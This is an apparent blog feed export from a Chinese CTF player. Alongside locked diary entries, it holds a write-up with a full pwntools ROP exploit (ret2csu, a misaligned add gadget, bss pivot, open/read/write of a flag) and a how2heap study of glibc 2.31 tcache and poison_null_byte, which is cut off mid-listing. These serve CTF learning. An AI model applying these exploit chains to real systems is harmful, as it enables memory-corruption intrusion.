    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b1d14bb74a4a02104ab107bcecc0e9402984a26ce0ba068c9cb97dfa46a85a49"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">where is otto ?</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>Diary</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2023 final</title>
    <link href="/2023/12/31/2023final/"/>
    <url>/2023/12/31/2023final/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a028a97c9604313e7d69aaf2319fda9bbc680397c113828b93593ad80f32d7a2"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">where is otto ?</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>Diary</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WHeelChair</title>
    <link href="/2023/11/16/Wheelchair/"/>
    <url>/2023/11/16/Wheelchair/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="53a13f9f7310b5a9250cd53d5604ea3af33070c2a82cf51ead17b10c2531fc3b"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">How to call me by adding otto?</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>Diary</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>mini-L 2023 复现</title>
    <link href="/2023/11/08/miniL/"/>
    <url>/2023/11/08/miniL/</url>
    
    <content type="html"><![CDATA[<p>给上半年填个坑.</p><span id="more"></span><h2 id="0x00">0x00</h2><p>11.4打了一个叫鹏城杯的比赛, 里面有一道题是无输出函数的栈溢出, 经过高人指点发现是和miniL-twins一样的东西, 这才想起来 当时根本就没有复现到这里, 忘记是彻底不会做还是被诸如期末考试什么的东西折磨了, 然后来来回回, 卡在这了, 又拖拖拖, 就到了现在了.</p><blockquote><p>本来想说点什么东西, 但是又觉得没什么好说的, 就这样吧</p></blockquote><h2 id="0x01-twins">0x01 twins</h2><p><img src="image-20231106195318501.png" alt="image-20231106195318501"></p><p>本身是一个骑脸的栈溢出, 在minil中这个题用了个脚本, 起了2个程序, 检测输出是否一样.</p><blockquote><p>pc杯是直接把所有输出函数直接去掉, 只有一次输入的机会, 还加了个orw.</p><p><s>当时做miniL的时候还在想什么办法绕, 这次直接开始找什么特殊的leak手段, 根本就没想到miniL还有这</s></p></blockquote><p>无输出, 意味着我们没有泄露的机会, 只能<strong>以一种间接的方式去硬跑libc里面的函数</strong>:</p><ul><li>内存中是有libc地址的, 举个最简单的例子就是<strong>bss段上的stdout</strong>等, <strong>且bss段可读可写</strong></li><li>在程序不开pie的时候, <strong>bss里的这段libc地址我们是已知的, 同时也可以得知与其他函数的偏移</strong></li><li>在 “<strong>ret2csu</strong>” 这种手法中, 我们可以做到用2段gadget布置参数且直接使用call调用, 非常强大</li></ul><p>那如果我们找到一些手段, 可以<strong>通过已知的偏移来对内存中的地址加以计算&amp;调用</strong>, 那便省去了leak这一步骤</p><hr><p>但是在这两道题当中, 采用一些标准化的手段并不能找到这么一种方式, 内存当中的gadget很规整, 几乎不会有这种机会, 这时候利用一些工具可以找到这样的一个gadget:</p><p><code>add dword ptr [rbp - 0x3d], ebx ; nop ; ret</code></p><p><img src="image-20231108023657813.png" alt="image-20231108023657813"></p><p>这个地方如果去打开ida的汇编查看的话, 是一句很明朗的语句:</p><p><img src="image-20231108023830313.png" alt="image-20231108023830313"></p><p>但是在上图ROPgadget的查找中, 我们使用grep/rg去查找的话, 便可以突破固有的指令, 实现<strong>错位</strong>.</p><blockquote><p>这个地方后续查了查别的wp, 很多人把这个东西叫做 “magic_gadget”, 我觉得还挺贴切的</p><p>并且看上去这种gadget的功能也比较强大, 我反正觉得肯定不只这一个能派上点用场, 又学废了</p></blockquote><p>在我们足以控制ebx和rbp的时候, 这个gadget的功能就似乎非常强大, 因为在ret2csu中就直接存在<code>pop rbx; pop rbp</code>, 普遍的偏移应该少有超过四个字节的, 所以在这里对libc而言效果甚至等同于一个任意地址写.</p><hr><p>twins这道题当中利用比较简洁, 只需要用两次add写入一个<code>/bin/sh</code>, 再add出一个偏移调用system, 中间控制一下参数即可, 同时这道题还是使用gets函数, 不限制输入长度, 一次性写好通了即可.</p><p>但是在pc杯这个题中, 第一次控制了输入长度0x100字节, 还要orw, 难度稍微要高出一些:</p><ul><li>第一次输入之后要迁移, 构造出一个很大的bss段输入.</li><li>第二次输入可以直接构造三段csu调用进行orw, 只是要多次进行控制参数, 看起来繁琐, 但实质是重复操作.</li></ul><p>放一个pc杯的题和exp, minil这个属于第一层, pc杯相对来讲是第二层, 思路一致, 很有说法.</p><p>链接：<a href="https://pan.baidu.com/s/1K3731YqV5HagDgVE40eyzA">https://pan.baidu.com/s/1K3731YqV5HagDgVE40eyzA</a><br>提取码：aqot</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#context(log_level=&#x27;debug&#x27;)</span><br>r=process(<span class="hljs-string">&quot;./silent&quot;</span>)<br><span class="hljs-comment">#r=remote(&quot;node4.buuoj.cn&quot;,27946)</span><br>elf=ELF(<span class="hljs-string">&quot;./silent&quot;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(r)<br>    pause()<br><br>csu_rbx_rbp_r12_r13_r14_r15=<span class="hljs-number">0x40095a</span><br>add_ebx_gadget=<span class="hljs-number">0x4007e8</span><br>csu_start=<span class="hljs-number">0x400936</span><br>stdout_offset=<span class="hljs-number">0x3ec760</span><br>offset_open=<span class="hljs-number">0x10fbf0</span>-stdout_offset<br>offset_read=<span class="hljs-number">0x110020</span>-<span class="hljs-number">0x10fbf0</span><br>offset_write=<span class="hljs-number">0x1100f0</span>-<span class="hljs-number">0x110020</span><br>mainaddr=<span class="hljs-number">0x400878</span><br>read_got=elf.got[<span class="hljs-string">&quot;read&quot;</span>]<br>leave_ret=<span class="hljs-number">0x4008fc</span><br><br>stdout=<span class="hljs-number">0x601020</span><br>bss=<span class="hljs-number">0x601800</span><br><br>padding=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span><br><br>payload1=padding+flat([<br>    csu_rbx_rbp_r12_r13_r14_r15,<br>    <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, read_got, <span class="hljs-number">0</span>, bss, <span class="hljs-number">0x600</span>,<br>    csu_start, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, bss, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    leave_ret<br>])<br><span class="hljs-comment">#debug()</span><br>r.sendline(payload1)<br><br>payload2=<span class="hljs-string">b&quot;./flag\x00\x00&quot;</span><br>payload2+=flat([<br>    csu_rbx_rbp_r12_r13_r14_r15,<br>    offset_open, stdout+<span class="hljs-number">0x3d</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    add_ebx_gadget,<br>    csu_rbx_rbp_r12_r13_r14_r15,<br>    <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, stdout, bss, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    csu_start, <span class="hljs-number">0</span>, <br>    offset_read, stdout+<span class="hljs-number">0x3d</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    add_ebx_gadget, <br>    csu_rbx_rbp_r12_r13_r14_r15,    <br>    <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, stdout, <span class="hljs-number">3</span>, bss-<span class="hljs-number">0x200</span>, <span class="hljs-number">0x40</span>,<br>    csu_start, <span class="hljs-number">0</span>,<br>    offset_write, stdout+<span class="hljs-number">0x3d</span>, stdout, <span class="hljs-number">1</span>, bss-<span class="hljs-number">0x200</span>, <span class="hljs-number">0x40</span>,<br>    add_ebx_gadget,<br>    csu_rbx_rbp_r12_r13_r14_r15,<br>    <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, stdout, <span class="hljs-number">1</span>, bss-<span class="hljs-number">0x200</span>, <span class="hljs-number">0x40</span>,<br>    csu_start, <span class="hljs-number">0</span>,<br>])<br>debug()<br>r.sendline(payload2)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><blockquote><p>这里说点题外话:</p><p>首先是<s>废话 刚需libc算偏移 pc杯是2.27的libc, 小版本1.5</s></p><p>再其次是, 如果这个题不开got表保护, 实际上应该是可以通过ret2dlresolve做的, (<s>minil有非预期, 但是pc杯就似乎很幽默的开了一个Full RELRO, 只能采用相对偏移去做,</s> 👴的评价是 彳亍8️⃣</p></blockquote><h2 id="0x0-Others">0x0? Others</h2><p>之前断断续续的复现过了一两道, 剩下大概三道, twins刚刚调完, 剩下两个似乎短时间还跟我无关,</p><p>但是慢慢学, 慢慢复现, 慢慢写, 估计也应该花不上特别多的时间吧, 希望不要🕊了.</p><blockquote><p>不知道等到把这几个题的手法都拿下的时候 会不会真的有一种放松感呢 ~</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>How2HE4p!</title>
    <link href="/2023/10/31/How2HEAP/"/>
    <url>/2023/10/31/How2HEAP/</url>
    
    <content type="html"><![CDATA[<p>how2heap奥, 看👴干不干你就完🌶️:</p><span id="more"></span><h2 id="0x00">0x00</h2><p>newstar今年week4非常的离奇, 除了一道2.23的doublefree, 那玩意给个勾来都秒了, 剩下全是2.31.</p><blockquote><p>后话是其中一道2.31居然是逆向题, 跟堆毫无关系</p></blockquote><p>踏马的, 看了看我贫瘠的堆题水平, 我发现我几乎就没怎么做过高版本的题, 2.31的水平仅限于最初级的tcache poisoning这种, 痛定思痛, 准备推一下how2heap.</p><p>这篇文章的进度预计是直接从2.31开推, 跟着源码一起看.</p><blockquote><p>以下是本文所用的资源:</p><p>how2heap:<a href="https://github.com/shellphish/how2heap">how2heap</a></p><p>roderick大神的博客:<a href="https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/">Glibc堆利用之house of系列总结 - roderick - record and learn! (roderickchan.cn)</a></p><p>源码网站: <a href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L2913">malloc.c - malloc/malloc.c - Glibc source code (glibc-2.31) - Bootlin</a></p><p>知乎上的一个专门的2.31的文章:<a href="https://zhuanlan.zhihu.com/p/136983333">Heap Exploit v2.31(zhihu.com)</a>,how2heap仓库下面有一个专门的2.31其实似乎就是这篇文章</p></blockquote><h2 id="0x01-2️⃣-3️⃣1️⃣">0x01 2️⃣.3️⃣1️⃣</h2><p>我们首先从tcache本身的一些东西入手:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span> *<span class="hljs-title">key</span>;</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure><p>2.31中, 我们可以看到原有的<code>tcache_entry</code>结构相较于2.27加了一层保护, 这层保护应用于2.29及以后的版本, 使用了一个key段, 该段位于chunk的bk段,</p><p>然后<code>tcache_put</code>函数中对key段做了一些手脚, 设置其值为tcache结构体的地址:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">tcache_put (mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)<br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br><br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache;<br><br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></td></tr></table></figure><p>如注释所说, 这一句话的作用是设置标志位, 将其置于tcache中, 防止double free.</p><p>这个保护在free处是这样的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  &#123;<br>    <span class="hljs-type">size_t</span> tc_idx = csize2tidx (size);<br>    <span class="hljs-keyword">if</span> (tcache != <span class="hljs-literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>      &#123;<br><span class="hljs-comment">/* Check to see if it&#x27;s already in the tcache.  */</span><br>tcache_entry *e = (tcache_entry *) chunk2mem (p);<br><br><span class="hljs-comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span><br><span class="hljs-comment">   trust it (it also matches random payload data at a 1 in</span><br><span class="hljs-comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span><br><span class="hljs-comment">   coincidence before aborting.  */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))<br>  &#123;<br>    tcache_entry *tmp;<br>    LIBC_PROBE (memory_tcache_double_free, <span class="hljs-number">2</span>, e, tc_idx);<br>    <span class="hljs-keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];<br> tmp;<br> tmp = tmp-&gt;next)<br>      <span class="hljs-keyword">if</span> (tmp == e)<br>malloc_printerr (<span class="hljs-string">&quot;free(): double free detected in tcache 2&quot;</span>);<br>    <span class="hljs-comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span><br><span class="hljs-comment">       few cycles, but don&#x27;t abort.  */</span><br>  &#125;<br><br><span class="hljs-keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>  &#123;<br>    tcache_put (p, tc_idx);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>我们可以看见, free时当key段是tcache时并不是直接挂掉, 而是通过tmp指针在entry链上逐个检查, 如果tmp指针与e(即chunk)的指针值相等,则认为是double free. 之前的tcache double free相当随意, 但是这个检查的绕过似乎也相当随意, 由于在检查时首先看的是key段, 所以只需要改掉key段即可.</p><p>这属于是最基础层面上的一些东西, 接下来看看how2heap里面的:</p><h3 id="1-1-poison-null-byte">1.1 poison_null_byte</h3><p>源码我还是整段的放一下吧:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to poison null byte!&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Tested in Ubuntu 20.04 64bit.&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.&quot;</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Some of the implementation details are borrowed from https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/off_by_null.c\n&quot;</span>);<br><br><span class="hljs-comment">// step1: allocate padding</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step1: allocate a large padding so that the fake chunk&#x27;s addresses&#x27;s lowest 2nd byte is \\x00&quot;</span>);<br><span class="hljs-type">void</span> *tmp = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br><span class="hljs-type">void</span> *heap_base = (<span class="hljs-type">void</span> *)((<span class="hljs-type">long</span>)tmp &amp; (~<span class="hljs-number">0xfff</span>)); <span class="hljs-comment">//页对齐</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap address: %p\n&quot;</span>, heap_base);<br><span class="hljs-type">size_t</span> size = <span class="hljs-number">0x10000</span> - ((<span class="hljs-type">long</span>)tmp&amp;<span class="hljs-number">0xffff</span>) - <span class="hljs-number">0x20</span>; <span class="hljs-comment">//构造个能对到0000的size</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Calculate padding chunk size: 0x%lx\n&quot;</span>, size);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocate the padding. This is required to avoid a 4-bit bruteforce because we are going to overwrite least significant two bytes.&quot;</span>);<br><span class="hljs-type">void</span> *padding= <span class="hljs-built_in">malloc</span>(size);<br><br><span class="hljs-comment">// step2: allocate prev chunk and victim chunk</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nStep2: allocate two chunks adjacent to each other.&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Let&#x27;s call the first one &#x27;prev&#x27; and the second one &#x27;victim&#x27;.&quot;</span>);<br><span class="hljs-type">void</span> *prev = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br><span class="hljs-type">void</span> *victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;malloc(0x10) to avoid consolidation&quot;</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prev chunk: malloc(0x500) = %p\n&quot;</span>, prev);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;victim chunk: malloc(0x4f0) = %p\n&quot;</span>, victim);<br><br><span class="hljs-comment">// step3: link prev into largebin</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nStep3: Link prev into largebin&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This step is necessary for us to forge a fake chunk later&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The fd_nextsize of prev and bk_nextsize of prev will be the fd and bck pointers of the fake chunk&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;allocate a chunk &#x27;a&#x27; with size a little bit smaller than prev&#x27;s&quot;</span>);<br><span class="hljs-type">void</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a: malloc(0x4f0) = %p\n&quot;</span>, a);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;malloc(0x10) to avoid consolidation&quot;</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;allocate a chunk &#x27;b&#x27; with size a little bit larger than prev&#x27;s&quot;</span>);<br><span class="hljs-type">void</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x510</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b: malloc(0x510) = %p\n&quot;</span>, b);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;malloc(0x10) to avoid consolidation&quot;</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nCurrent Heap Layout\n&quot;</span><br> <span class="hljs-string">&quot;    ... ...\n&quot;</span><br> <span class="hljs-string">&quot;padding\n&quot;</span><br> <span class="hljs-string">&quot;    prev Chunk(addr=0x??0010, size=0x510)\n&quot;</span><br>      <span class="hljs-string">&quot;  victim Chunk(addr=0x??0520, size=0x500)\n&quot;</span><br> <span class="hljs-string">&quot; barrier Chunk(addr=0x??0a20, size=0x20)\n&quot;</span><br> <span class="hljs-string">&quot;       a Chunk(addr=0x??0a40, size=0x500)\n&quot;</span><br> <span class="hljs-string">&quot; barrier Chunk(addr=0x??0f40, size=0x20)\n&quot;</span><br> <span class="hljs-string">&quot;       b Chunk(addr=0x??0f60, size=0x520)\n&quot;</span><br> <span class="hljs-string">&quot; barrier Chunk(addr=0x??1480, size=0x20)\n&quot;</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now free a, b, prev&quot;</span>);<br><span class="hljs-built_in">free</span>(a);<br><span class="hljs-built_in">free</span>(b);<br><span class="hljs-built_in">free</span>(prev);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;current unsorted_bin:  header &lt;-&gt; [prev, size=0x510] &lt;-&gt; [b, size=0x520] &lt;-&gt; [a, size=0x500]\n&quot;</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocate a huge chunk to enable sorting&quot;</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;current large_bin:  header &lt;-&gt; [b, size=0x520] &lt;-&gt; [prev, size=0x510] &lt;-&gt; [a, size=0x500]\n&quot;</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This will add a, b and prev to largebin\nNow prev is in 